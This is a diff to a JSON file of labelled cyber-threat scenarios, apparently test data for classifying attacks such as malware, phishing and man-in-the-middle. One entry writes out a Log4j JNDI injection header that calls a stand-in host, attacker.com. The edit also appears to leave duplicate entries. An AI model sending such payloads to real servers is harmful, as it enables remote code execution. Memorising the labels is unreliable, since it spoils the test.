@@ -1,8 +1,33 @@
 [
   {
-    "id": 1,
-    "threat_description": "Email from spoofed CEO domain requesting urgent wire transfer with fake DocuSign link at http://docusign-secure.ceo-financials.com/sign. Email sent at 2:47 AM, real domain is company.com.",
+    "id": 5,
+    "threat_description": "Antivirus detects outbound traffic to 185.220.101.x at irregular intervals. System processes silently spawning cmd.exe and powershell.exe with encoded payloads.",
+    "true_label": "Malware"
+  },
+  {
+    "id": 6,
+    "threat_description": "A system administrator notices that a contractor account is accessing the HR payroll database at 11 PM on a Sunday. The account has no legitimate reason to access payroll. Exfiltration of 4,200 employee salary records is suspected.",
+    "true_label": "Insider Threat"
+  },
+  {
+    "id": 7,
+    "threat_description": "A hospital network logs show a device sending ARP replies claiming to be the default gateway. All traffic from workstations on VLAN 10 is being routed through an unknown MAC address before reaching the internet.",
+    "true_label": "Man-in-the-Middle"
+  },
+  {
+    "id": 8,
+    "threat_description": "A web server running Apache Log4j 2.14.1 receives a GET request with the header: X-Api-Version: ${jndi:ldap://attacker.com/exploit}. The server makes an outbound LDAP connection to the attacker's server seconds later.",
+    "true_label": "Zero-Day Exploit"
+  },
+  {
+    "id": 9,
+    "threat_description": "Multiple employees report receiving SMS messages claiming to be from IT support, asking them to click a link and enter their VPN credentials to avoid account suspension. The link leads to a convincing fake corporate portal.",
     "true_label": "Phishing"
+  },
+  {
+    "id": 10,
+    "threat_description": "Security tools detect PowerShell executing encoded commands that download a payload from a remote server, establish persistence via registry run keys, disable Windows Defender, and begin scanning internal network ports.",
+    "true_label": "Malware"
   },
   {
     "id": 2,
@@ -26,27 +51,27 @@
   },
   {
     "id": 6,
-    "threat_description": "Public-facing Apache Log4j server is receiving specially crafted JNDI lookup strings in User-Agent headers: ${jndi:ldap://attacker.com/a}. Remote code execution observed.",
-    "true_label": "Zero-Day Exploit"
-  },
-  {
-    "id": 7,
-    "threat_description": "Senior database administrator is accessing and exporting large volumes of customer PII records outside business hours, copies to personal USB drives, and has submitted a resignation.",
+    "threat_description": "A system administrator notices that a contractor account is accessing the HR payroll database at 11 PM on a Sunday. The account has no legitimate reason to access payroll. Exfiltration of 4,200 employee salary records is suspected.",
     "true_label": "Insider Threat"
   },
   {
-    "id": 8,
-    "threat_description": "SSL/TLS certificate mismatch detected on internal API gateway. Unencrypted credentials found in intercepted HTTP sessions between employee laptops and the login portal.",
+    "id": 7,
+    "threat_description": "A hospital network logs show a device sending ARP replies claiming to be the default gateway. All traffic from workstations on VLAN 10 is being routed through an unknown MAC address before reaching the internet.",
     "true_label": "Man-in-the-Middle"
   },
   {
+    "id": 8,
+    "threat_description": "A web server running Apache Log4j 2.14.1 receives a GET request with the header: X-Api-Version: ${jndi:ldap://attacker.com/exploit}. The server makes an outbound LDAP connection to the attacker's server seconds later.",
+    "true_label": "Zero-Day Exploit"
+  },
+  {
     "id": 9,
-    "threat_description": "Multiple user accounts report receiving password reset emails they did not request. Attacker used email enumeration on the password reset endpoint to identify valid accounts.",
+    "threat_description": "Multiple employees report receiving SMS messages claiming to be from IT support, asking them to click a link and enter their VPN credentials to avoid account suspension. The link leads to a convincing fake corporate portal.",
     "true_label": "Phishing"
   },
   {
     "id": 10,
-    "threat_description": "Network scanner detects a Windows SMB vulnerability CVE-2017-0144 (EternalBlue) being exploited across internal hosts. Lateral movement observed with admin share access.",
+    "threat_description": "Security tools detect PowerShell executing encoded commands that download a payload from a remote server, establish persistence via registry run keys, disable Windows Defender, and begin scanning internal network ports.",
     "true_label": "Malware"
   }
 ]
